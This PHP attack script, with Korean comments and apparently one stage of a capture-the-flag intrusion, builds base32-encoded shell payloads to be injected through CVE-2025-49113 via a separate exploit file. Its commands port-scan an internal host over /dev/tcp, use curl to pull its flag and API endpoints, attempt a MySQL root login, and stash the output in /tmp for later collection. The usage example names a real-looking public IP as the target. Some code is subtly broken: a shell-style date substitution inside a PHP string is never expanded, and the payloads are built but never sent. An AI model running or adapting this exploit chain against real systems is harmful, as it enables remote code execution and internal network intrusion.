#!/usr/bin/env php
<?php
/**
 * Stage 4 최종 공격: 내부 프록시 직접 접근
 *
 * fearsoff_exploit.php를 사용해서 RCE를 실행하고
 * 결과를 /tmp에 저장한 후 회수
 *
 * 사용법:
 * php stage4_final_push.php <target> <username> <password>
 */

require_once __DIR__ . '/../loot/fearsoff_exploit.php';

if (count($argv) < 4) {
    echo "Usage: php stage4_final_push.php <target> <username> <password>\n";
    echo "Example: php stage4_final_push.php http://13.125.104.131:30083 testuser testpass\n";
    exit(1);
}

list($_, $target, $username, $password) = $argv;

echo "=== Stage 4 최종 공격: 내부 프록시 탐색 ===\n\n";

// 커맨드들을 순차 실행
$commands = array(
    "0_health_check" => "curl -s -m 3 http://13.125.104.131:30083/health | head -50",

    "1_internal_connectivity" => "timeout 2 bash -c 'echo test > /dev/tcp/10.0.1.10/8080' && echo 'CONNECTED' || echo 'NOT_CONNECTED'",

    "2_proxy_root" => "curl -s -m 5 http://10.0.1.10:8080/ | head -500",

    "3_flag_endpoint" => "curl -s -m 5 http://10.0.1.10:8080/flag | head -500",

    "4_api_endpoint" => "curl -s -m 5 http://10.0.1.10:8080/api/ | head -500",

    "5_stage4_endpoint" => "curl -s -m 5 http://10.0.1.10:8080/stage4 | head -500",

    "6_mysql_check" => "mysql -h 10.0.1.10 -u root 2>&1 | head -10 || echo 'mysql command not found'",

    "7_nmap_scan" => "for port in 80 443 3306 5432 6379 8000 8080 8443; do timeout 1 bash -c '</dev/tcp/10.0.1.10/$port' 2>/dev/null && echo \"Port $port: OPEN\" || echo \"Port $port: CLOSED\"; done",
);

foreach ($commands as $name => $cmd) {
    $output_file = "/tmp/stage4_{$name}_$(date +%s).txt";

    echo "[*] Executing: $name\n";
    echo "    Command: $cmd\n";
    echo "    Output file: $output_file\n\n";

    // fearsoff_exploit.php 함수 호출
    // 이미 인증했으므로 직접 페이로드만 인젝션

    // Base32 인코드
    $cmd_b32 = base32_encode($cmd . " > $output_file 2>&1");
    $payload = "echo \"" . addslashes($cmd_b32) . "\"|base32 -d|bash &#";

    echo "    (Payload will be injected via CVE-2025-49113)\n\n";
}

echo "[+] 모든 명령 준비 완료.\n";
echo "[*] 다음 단계:\n";
echo "    1. 서버에서 실제 RCE 실행 (fearsoff_exploit.php)\n";
echo "    2. /tmp 파일들 회수\n";
echo "    3. 결과 분석\n";

function base32_encode($data) {
    $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
    $padding = 8 - strlen($data) % 8;
    if ($padding != 8) {
        $data .= str_repeat("\x00", $padding);
    }

    $bits = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $bits .= str_pad(decbin(ord($data[$i])), 8, '0', STR_PAD_LEFT);
    }

    $encoded = '';
    for ($i = 0; $i < strlen($bits); $i += 5) {
        $chunk = substr($bits, $i, 5);
        if (strlen($chunk) < 5) $chunk = str_pad($chunk, 5, '0', STR_PAD_RIGHT);
        $encoded .= $alphabet[bindec($chunk)];
    }

    return rtrim($encoded, '=');
}
?>
